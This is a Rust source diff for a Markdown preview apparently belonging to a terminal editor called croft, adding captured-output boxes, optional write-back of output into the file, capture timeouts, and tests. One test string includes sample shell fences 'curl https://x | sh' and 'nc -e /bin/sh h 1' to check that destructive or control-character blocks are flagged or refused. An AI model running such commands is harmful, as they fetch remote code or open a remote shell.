@@ -91,6 +91,17 @@ pub struct MdRunnable {
     /// `{cwd=root}` runs in the workspace root instead of the document's
     /// directory. The only `cwd=` value honoured.
     pub cwd_root: bool,
+    /// `{persist}` writes the captured output back into the SOURCE file as a
+    /// following fence, replacing the previous one (#354). Without it a
+    /// capture lives in memory for the session and the document is never
+    /// touched, which is the default because a preview action writing to the
+    /// user's file is a bigger promise than running a command in a pane.
+    pub persist: bool,
+    /// `{timeout=N}` stops the CAPTURE after N seconds, never the process.
+    /// A long-running block keeps running in its pane; croft just stops
+    /// waiting to describe it. `None` means wait for the shell to say the
+    /// command finished.
+    pub capture_timeout: Option<u64>,
 }
 
 /// The play glyph a runnable fence wears in place of its first bar.
@@ -113,6 +124,120 @@ pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
 }
 
 /// The fence's language word and its `{a=b c}` attributes.
+/// One captured run of a fence, shown under it in the preview.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct BlockOutput {
+    /// The command's output as the pane printed it, escapes included so the
+    /// preview can colour it through the same `ansi_text` path the log view
+    /// uses. Empty when the command printed nothing.
+    pub text: String,
+    /// The shell's exit code, `None` when it did not report one.
+    pub exit: Option<i32>,
+    /// The capture gave up before the shell said the command had finished
+    /// (`{timeout=N}`). The process is still running; only the wait stopped.
+    pub timed_out: bool,
+}
+
+/// Captured runs keyed by the fence opener's source line (#354).
+pub type BlockOutputs = std::collections::HashMap<usize, BlockOutput>;
+
+/// Rows of captured output shown under a fence before it is cut short.
+///
+/// The box is a summary, not a pager: the pane it ran in still holds the
+/// whole thing, and the footer says so. Twelve keeps a long build from
+/// pushing the rest of the document off screen.
+const OUTPUT_ROWS: usize = 12;
+
+/// Colour one line of captured output through the same `ansi_text` path the
+/// log view uses, so a block's output looks in the preview exactly as it
+/// looked in the pane.
+fn output_spans(
+    raw: &str,
+    style: &mut crate::ansi_text::AnsiStyle,
+    theme: Theme,
+) -> Vec<Span<'static>> {
+    let parsed = crate::ansi_text::parse_line(raw, style);
+    if parsed.spans.is_empty() {
+        return vec![Span::styled(
+            parsed.text,
+            Style::default().fg(theme.ui(Color::Rgb(0x9a, 0x9a, 0x9a))),
+        )];
+    }
+    parsed
+        .spans
+        .iter()
+        .map(|sp| {
+            let mut st = Style::default();
+            if let Some(c) = sp.style.fg {
+                st = st.fg(crate::widgets::editor::ansi_color_to_tui(c, theme));
+            }
+            if let Some(c) = sp.style.bg {
+                st = st.bg(crate::widgets::editor::ansi_color_to_tui(c, theme));
+            }
+            if sp.style.bold {
+                st = st.add_modifier(Modifier::BOLD);
+            }
+            Span::styled(parsed.text[sp.start..sp.end].to_string(), st)
+        })
+        .collect()
+}
+
+/// Marks a fence croft wrote, so a later run replaces it instead of
+/// stacking a second one. An ordinary HTML comment, so it renders as
+/// nothing in every Markdown viewer including this one.
+pub const OUTPUT_MARKER: &str = "<!-- croft:output -->";
+
+/// Put `output` into `text` as the output fence for the block whose opener
+/// is at `block_line` (#354), replacing a previous one if it is there.
+///
+/// Returns `None` when `block_line` does not name a fence opener, which is
+/// how a document edited since the block ran is refused rather than
+/// rewritten at a line that now means something else. That check is the
+/// whole safety story for a preview action that writes to the user's file:
+/// the block's line number is only meaningful against the text that
+/// produced it.
+///
+/// Exactly one output fence per block, and no other fence is touched. The
+/// search starts at the block's own closer and accepts only an immediately
+/// following marker + fence pair, so a hand-written fence below the block
+/// is left alone.
+pub fn replace_output_fence(text: &str, block_line: usize, output: &str) -> Option<String> {
+    let lines: Vec<&str> = text.split_inclusive('\n').collect();
+    let opener = lines.get(block_line)?;
+    if !opener.trim_start().starts_with("```") {
+        return None;
+    }
+    // The block's closer: the next line that is a bare fence.
+    let close = (block_line + 1..lines.len())
+        .find(|&i| lines[i].trim() == "```" || lines[i].trim() == "~~~")?;
+    let mut after = close + 1;
+    // Skip one blank line, then take a marked pair if it is there.
+    let blank = lines.get(after).is_some_and(|l| l.trim().is_empty());
+    let probe = if blank { after + 1 } else { after };
+    if lines.get(probe).is_some_and(|l| l.trim() == OUTPUT_MARKER)
+        && let Some(end) =
+            (probe + 1..lines.len()).find(|&i| lines[i].trim() == "```" || lines[i].trim() == "~~~")
+    {
+        after = end + 1;
+    }
+    let mut out = String::with_capacity(text.len() + output.len() + 64);
+    for l in &lines[..close + 1] {
+        out.push_str(l);
+    }
+    out.push('\n');
+    out.push_str(OUTPUT_MARKER);
+    out.push_str("\n```text\n");
+    for line in output.lines() {
+        out.push_str(line);
+        out.push('\n');
+    }
+    out.push_str("```\n");
+    for l in &lines[after..] {
+        out.push_str(l);
+    }
+    Some(out)
+}
+
 pub(crate) fn split_info(info: &str) -> (&str, Vec<&str>) {
     let info = info.trim();
     let (lang, rest) = match info.find('{') {
@@ -501,6 +626,9 @@ struct Renderer<'r> {
     code_info: String,
     code_lines: (usize, usize),
     runnables: Vec<MdRunnable>,
+    /// Captured runs to show under their fences (#354). Empty for a
+    /// document nothing has been run from, which is the common case.
+    outputs: BlockOutputs,
     /// Rows of cell texts while inside a table (row 0 is the header).
     table: Option<Vec<Vec<String>>>,
     /// Directory local image paths resolve against (#176); None keeps
@@ -611,6 +739,10 @@ impl Renderer<'_> {
                     interpreter,
                     destructive: attrs.contains(&"confirm") || looks_destructive(&text),
                     cwd_root: attrs.contains(&"cwd=root"),
+                    persist: attrs.contains(&"persist"),
+                    capture_timeout: attrs
+                        .iter()
+                        .find_map(|a| a.strip_prefix("timeout=").and_then(|v| v.parse().ok())),
                 }
             });
         let bar = Span::styled("\u{258e} ", Style::default().fg(self.theme.accent()));
@@ -642,9 +774,74 @@ impl Renderer<'_> {
             self.out.push(Line::from(spans));
         }
         if let Some(r) = runnable {
+            self.push_output_box(&bar, &r);
             self.runnables.push(r);
         }
         self.out.push(Line::default());
+    }
+
+    /// The captured output of `r`'s last run, under its fence (#354).
+    ///
+    /// Nothing is emitted when the block has not been run this session,
+    /// which is why a document that has never been run renders exactly as
+    /// it did before this existed. The rows carry the same bar glyph as the
+    /// code above them, so the box reads as belonging to the block rather
+    /// than as prose that happens to follow it.
+    fn push_output_box(&mut self, bar: &Span<'static>, r: &MdRunnable) {
+        let Some(out) = self.outputs.get(&r.lines.0) else {
+            return;
+        };
+        let dim = Style::default().fg(self.theme.ui(Color::Rgb(0x9a, 0x9a, 0x9a)));
+        // The status says which of the three things happened, because they
+        // are genuinely different: it finished well, it finished badly, or
+        // croft stopped waiting while it kept running.
+        let status = if out.timed_out {
+            Span::styled(
+                " still running".to_string(),
+                Style::default().fg(self.theme.ui(Color::Rgb(0xff, 0xd7, 0x4a))),
+            )
+        } else {
+            match out.exit {
+                Some(0) | None => Span::styled(" ok".to_string(), dim),
+                Some(code) => Span::styled(
+                    format!(" exit {code}"),
+                    Style::default()
+                        .fg(self.theme.ui(Color::Rgb(0xff, 0x5f, 0x5f)))
+                        .add_modifier(Modifier::BOLD),
+                ),
+            }
+        };
+        self.out.push(Line::from(vec![
+            bar.clone(),
+            Span::styled("Output".to_string(), dim.add_modifier(Modifier::BOLD)),
+            status,
+        ]));
+
+        let lines: Vec<&str> = out.text.lines().collect();
+        // The LAST rows, not the first: a build's interesting part is its
+        // end, and the pane still holds the whole thing.
+        let skipped = lines.len().saturating_sub(OUTPUT_ROWS);
+        if skipped > 0 {
+            self.out.push(Line::from(vec![
+                bar.clone(),
+                Span::styled(format!("… {skipped} earlier line(s)"), dim),
+            ]));
+        }
+        let mut style = crate::ansi_text::AnsiStyle::default();
+        for line in &lines[skipped..] {
+            let mut spans = vec![bar.clone()];
+            spans.extend(output_spans(line, &mut style, self.theme));
+            self.out.push(Line::from(spans));
+        }
+        if out.timed_out {
+            self.out.push(Line::from(vec![
+                bar.clone(),
+                Span::styled(
+                    "croft stopped waiting; the block is still running in its pane".to_string(),
+                    dim,
+                ),
+            ]));
+        }
     }
 
     fn end_table(&mut self) {
@@ -724,7 +921,8 @@ pub fn render_markdown_with_images(
     registry: &mut LangRegistry,
     base_dir: Option<&std::path::Path>,
 ) -> (Vec<Line<'static>>, Vec<MdImage>) {
-    let (lines, images, _) = render_markdown_full(text, theme, registry, base_dir);
+    let (lines, images, _) =
+        render_markdown_full(text, theme, registry, base_dir, BlockOutputs::new());
     (lines, images)
 }
 
@@ -734,6 +932,7 @@ pub fn render_markdown_full(
     theme: Theme,
     registry: &mut LangRegistry,
     base_dir: Option<&std::path::Path>,
+    outputs: BlockOutputs,
 ) -> (Vec<Line<'static>>, Vec<MdImage>, Vec<MdRunnable>) {
     let options =
         Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS;
@@ -754,6 +953,7 @@ pub fn render_markdown_full(
         code_info: String::new(),
         code_lines: (0, 0),
         runnables: Vec::new(),
+        outputs,
         table: None,
         base_dir: base_dir.map(|p| p.to_path_buf()),
         images: Vec::new(),
@@ -1233,17 +1433,175 @@ mod tests {
     /// first rendered line and source range; `{run=false}` opts out; a rust
     /// fence is not runnable; destructive-looking blocks and `{confirm}`
     /// are flagged; a block carrying a control character is refused.
+    /// #354's first acceptance criterion: a run that printed `hi` and
+    /// exited 3 shows `hi` under the block and says the exit was bad.
+    #[test]
+    fn a_captured_run_shows_its_output_and_a_bad_exit_under_the_block() {
+        let md = "```sh\necho hi; exit 3\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+
+        // Nothing has been run, so the document renders as it always did.
+        let (before, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 1);
+        let joined = |ls: &[Line<'static>]| -> String {
+            ls.iter()
+                .map(|l| {
+                    l.spans
+                        .iter()
+                        .map(|s| s.content.as_ref())
+                        .collect::<String>()
+                })
+                .collect::<Vec<_>>()
+                .join("\n")
+        };
+        assert!(
+            !joined(&before).contains("Output"),
+            "an unrun block has no box: {}",
+            joined(&before)
+        );
+
+        let mut outputs = BlockOutputs::new();
+        outputs.insert(
+            runs[0].lines.0,
+            BlockOutput {
+                text: String::from("hi\n"),
+                exit: Some(3),
+                timed_out: false,
+            },
+        );
+        let (after, _, _) = render_markdown_full(md, Theme::default(), &mut reg, None, outputs);
+        let text = joined(&after);
+        assert!(text.contains("Output"), "{text}");
+        assert!(text.contains("hi"), "the captured output is shown: {text}");
+        assert!(
+            text.contains("exit 3"),
+            "a non-zero exit is named, not just implied: {text}"
+        );
+    }
+
+    /// A capture that gave up says so, and says the process did not.
+    #[test]
+    fn a_timed_out_capture_says_the_block_is_still_running() {
+        let md = "```sh {timeout=1}\nsleep 60\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (_, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs[0].capture_timeout, Some(1), "{:?}", runs[0]);
+        let mut outputs = BlockOutputs::new();
+        outputs.insert(
+            runs[0].lines.0,
+            BlockOutput {
+                text: String::new(),
+                exit: None,
+                timed_out: true,
+            },
+        );
+        let (after, _, _) = render_markdown_full(md, Theme::default(), &mut reg, None, outputs);
+        let text: String = after
+            .iter()
+            .map(|l| {
+                l.spans
+                    .iter()
+                    .map(|s| s.content.as_ref())
+                    .collect::<String>()
+            })
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(text.contains("still running"), "{text}");
+        assert!(
+            text.contains("stopped waiting"),
+            "the box says the PROCESS was not stopped, only the wait: {text}"
+        );
+    }
+
+    /// `{persist}` writes exactly ONE output fence and replaces it on the
+    /// next run, never touching another fence (#354).
+    #[test]
+    fn an_output_fence_is_written_once_and_then_replaced() {
+        let doc = "# T\n\n```sh\necho hi\n```\n\nprose after\n\n```sh\necho other\n```\n";
+        // The `sh` opener is line 2 (0-based), counting the heading and the
+        // blank line before it.
+        let first = replace_output_fence(doc, 2, "hi\n").expect("the opener is a fence");
+        assert_eq!(
+            first.matches(OUTPUT_MARKER).count(),
+            1,
+            "exactly one output fence: {first}"
+        );
+        assert!(first.contains("```text\nhi\n```"), "{first}");
+        assert!(
+            first.contains("prose after") && first.contains("echo other"),
+            "the rest of the document survives: {first}"
+        );
+
+        // A second run REPLACES rather than stacking, and the other fence
+        // is still untouched.
+        let second = replace_output_fence(&first, 2, "bye\n").expect("still a fence");
+        assert_eq!(
+            second.matches(OUTPUT_MARKER).count(),
+            1,
+            "still exactly one: {second}"
+        );
+        assert!(second.contains("bye"), "{second}");
+        assert!(
+            !second.contains("```text\nhi\n"),
+            "the old output is gone: {second}"
+        );
+        assert_eq!(
+            second.matches("echo other").count(),
+            1,
+            "the unrelated fence is untouched: {second}"
+        );
+    }
+
+    /// A line that is no longer a fence opener means the document moved
+    /// under the capture, and a write there would land on whatever now
+    /// occupies that line.
+    #[test]
+    fn a_stale_block_line_refuses_rather_than_writing_somewhere_else() {
+        let doc = "# T\n\nprose, not a fence\n\n```sh\necho hi\n```\n";
+        assert_eq!(
+            replace_output_fence(doc, 2, "hi\n"),
+            None,
+            "line 2 is prose now, so there is nothing to attach an output to"
+        );
+        assert_eq!(
+            replace_output_fence(doc, 99, "hi\n"),
+            None,
+            "and a line past the end is refused rather than appended to"
+        );
+    }
+
+    /// A hand-written fence below the block is not croft's to replace: only
+    /// a fence carrying the marker is.
+    #[test]
+    fn an_unmarked_following_fence_is_left_alone() {
+        let doc = "```sh\necho hi\n```\n\n```text\nmine, not croft's\n```\n";
+        let out = replace_output_fence(doc, 0, "hi\n").expect("the opener is a fence");
+        assert!(
+            out.contains("mine, not croft's"),
+            "a fence croft did not write survives: {out}"
+        );
+        assert_eq!(out.matches(OUTPUT_MARKER).count(), 1, "{out}");
+    }
+
     #[test]
     fn shell_fences_are_runnable_and_carry_the_play_glyph() {
         let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
         let mut reg = crate::highlight::LangRegistry::new();
-        let (lines, _, runs) = render_markdown_full(md, Theme::default(), &mut reg, None);
+        let (lines, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
         assert_eq!(runs.len(), 3, "{runs:?}");
         assert_eq!(runs[0].code, "echo one\necho two\n");
         assert_eq!(runs[0].interpreter, "sh");
         assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
         assert!(!runs[0].destructive && !runs[0].cwd_root);
         assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
+        assert!(
+            !runs[0].persist && runs[0].capture_timeout.is_none(),
+            "a bare fence captures in memory and waits for the shell: {:?}",
+            runs[0]
+        );
         assert_eq!(runs[1].lines, (15, 18));
         assert!(runs[2].destructive, "curl | sh is flagged");
         let first = &lines[runs[0].first_line];
@@ -1285,19 +1643,27 @@ mod tests {
         // A fence inside a list item: the source range still spans the
         // opener through the closer, indented or not.
         let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
-        let (_, _, runs) = render_markdown_full(nested, Theme::default(), &mut reg, None);
+        let (_, _, runs) = render_markdown_full(
+            nested,
+            Theme::default(),
+            &mut reg,
+            None,
+            BlockOutputs::new(),
+        );
         assert_eq!(runs.len(), 1, "{runs:?}");
         assert_eq!(runs[0].lines, (2, 5));
         assert_eq!(runs[0].code.trim(), "echo nested");
         // An unterminated fence at EOF still gets a range.
         let open = "```sh\necho hi\n";
-        let (_, _, runs) = render_markdown_full(open, Theme::default(), &mut reg, None);
+        let (_, _, runs) =
+            render_markdown_full(open, Theme::default(), &mut reg, None, BlockOutputs::new());
         assert_eq!(runs.len(), 1);
         assert_eq!(runs[0].lines.0, 0);
         assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
         // A whitespace-only fence wears no glyph.
         let blank = "```sh\n   \n```\n";
-        let (_, _, runs) = render_markdown_full(blank, Theme::default(), &mut reg, None);
+        let (_, _, runs) =
+            render_markdown_full(blank, Theme::default(), &mut reg, None, BlockOutputs::new());
         assert!(runs.is_empty());
     }
 
@@ -1313,7 +1679,8 @@ mod tests {
         // `>` alone renders as an empty row, which the front trim removes.
         let md = ">\n\n```sh\necho one\n```\n";
         let mut reg = crate::highlight::LangRegistry::new();
-        let (lines, _, runs) = render_markdown_full(md, Theme::default(), &mut reg, None);
+        let (lines, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
         assert_eq!(runs.len(), 1, "{runs:?}");
         let row = &lines[runs[0].first_line];
         assert_eq!(
